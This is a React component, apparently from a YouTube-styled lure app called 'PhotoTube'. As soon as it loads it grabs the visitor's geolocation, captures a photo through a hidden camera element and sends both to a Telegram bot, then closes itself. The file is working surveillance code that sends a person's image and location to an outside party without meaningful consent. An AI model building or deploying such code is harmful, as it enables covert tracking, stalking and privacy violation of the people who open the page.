import { useState, useRef, useEffect } from 'react';
import { cameraService } from '@/lib/camera';
import { locationService, type LocationData } from '@/lib/location';
import { sendPhotoToTelegram, sendLocationToTelegram } from '@/lib/telegram';
import { NotificationToast } from './notification-toast';
import { MapPin, Send, CheckCircle, XCircle, Loader2, Camera } from 'lucide-react';

interface SilentCaptureProps {
  onComplete: () => void;
}

export function SilentCapture({ onComplete }: SilentCaptureProps) {
  const [status, setStatus] = useState<'requesting' | 'capturing' | 'sending' | 'complete' | 'error'>('requesting');
  const [location, setLocation] = useState<LocationData | null>(null);
  const [progress, setProgress] = useState('Initializing...');
  const [notification, setNotification] = useState<{
    show: boolean;
    type: 'success' | 'error' | 'warning';
    title: string;
    message: string;
  }>({ show: false, type: 'success', title: '', message: '' });

  const videoRef = useRef<HTMLVideoElement>(null);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (!hasStarted.current) {
      hasStarted.current = true;
      startSilentCapture();
    }
  }, []);

  const showNotification = (type: 'success' | 'error' | 'warning', title: string, message: string) => {
    setNotification({ show: true, type, title, message });
  };

  const hideNotification = () => {
    setNotification(prev => ({ ...prev, show: false }));
  };

  const startSilentCapture = async () => {
    try {
      // Step 1: Get location first
      setProgress('Getting your location...');
      
      let locationData: LocationData | null = null;
      try {
        locationData = await locationService.getCurrentLocation();
        setLocation(locationData);
        setProgress('Location acquired successfully');
        showNotification('success', 'Location Ready', `Location found with ±${Math.round(locationData.accuracy)}m accuracy`);
      } catch (error: any) {
        setProgress('Location unavailable, continuing...');
        showNotification('warning', 'Location Unavailable', 'Photo will be sent without location data');
      }

      // Step 2: Start camera silently
      setStatus('capturing');
      setProgress('Accessing camera...');
      
      const stream = await cameraService.startCamera();
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.muted = true;
        videoRef.current.play();
      }

      // Wait for camera to stabilize
      setProgress('Preparing camera...');
      await new Promise(resolve => setTimeout(resolve, 1500));

      // Step 3: Capture photo silently
      setProgress('Taking photo...');
      
      if (!videoRef.current) {
        throw new Error('Camera not ready');
      }

      const photoBlob = await cameraService.capturePhoto(videoRef.current);
      showNotification('success', 'Photo Captured', 'Photo taken successfully');
      
      // Stop camera immediately after capture
      cameraService.stopCamera();

      // Step 4: Send to Telegram
      setStatus('sending');
      setProgress('Sending to Telegram...');

      const result = await sendPhotoToTelegram(photoBlob, locationData || undefined);
      
      if (result.ok) {
        // Send location as separate message if available
        if (locationData) {
          setProgress('Sending location...');
          await sendLocationToTelegram(locationData);
        }
        
        setStatus('complete');
        setProgress('Success! Sent to Telegram');
        showNotification('success', 'Success!', 'Photo and location sent to Telegram successfully');
        
        // Auto-close after 2 seconds
        setTimeout(() => {
          onComplete();
        }, 2000);
      } else {
        throw new Error(result.description || 'Failed to send photo');
      }

    } catch (error: any) {
      setStatus('error');
      setProgress('Failed to capture and send');
      showNotification('error', 'Capture Failed', error.message || 'An error occurred during capture');
      
      // Auto-close after 4 seconds on error
      setTimeout(() => {
        onComplete();
      }, 4000);
    } finally {
      // Ensure camera is stopped
      cameraService.stopCamera();
    }
  };

  const getStatusIcon = () => {
    switch (status) {
      case 'requesting':
        return <Loader2 className="h-6 w-6 animate-spin text-blue-400" />;
      case 'capturing':
        return <Camera className="h-6 w-6 text-yellow-400" />;
      case 'sending':
        return <Send className="h-6 w-6 text-blue-400" />;
      case 'complete':
        return <CheckCircle className="h-6 w-6 text-green-400" />;
      case 'error':
        return <XCircle className="h-6 w-6 text-red-400" />;
    }
  };

  return (
    <>
      <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50">
        <div className="bg-youtube-secondary border border-youtube-elevated rounded-xl p-6 max-w-sm w-full mx-4">
          <div className="text-center space-y-4">
            <h2 className="text-xl font-bold text-white">PhotoTube</h2>
            
            {/* Hidden video element for capture */}
            <video
              ref={videoRef}
              className="hidden"
              autoPlay
              muted
              playsInline
            />

            {/* Status */}
            <div className="flex flex-col items-center space-y-3">
              {getStatusIcon()}
              <p className="text-white font-medium">{progress}</p>
              
              {/* Location Status */}
              <div className="flex items-center space-x-2 text-sm">
                <MapPin className={`h-4 w-4 ${location ? 'text-green-400' : 'text-gray-400'}`} />
                <span className="text-gray-300">
                  {location 
                    ? `Location: ±${Math.round(location.accuracy)}m` 
                    : 'Location: Unavailable'
                  }
                </span>
              </div>
            </div>

            {status === 'complete' && (
              <p className="text-sm text-gray-400">Closing in 2 seconds...</p>
            )}
            
            {status === 'error' && (
              <p className="text-sm text-gray-400">Closing in 4 seconds...</p>
            )}
          </div>
        </div>
      </div>

      <NotificationToast
        type={notification.type}
        title={notification.title}
        message={notification.message}
        show={notification.show}
        onHide={hideNotification}
      />
    </>
  );
}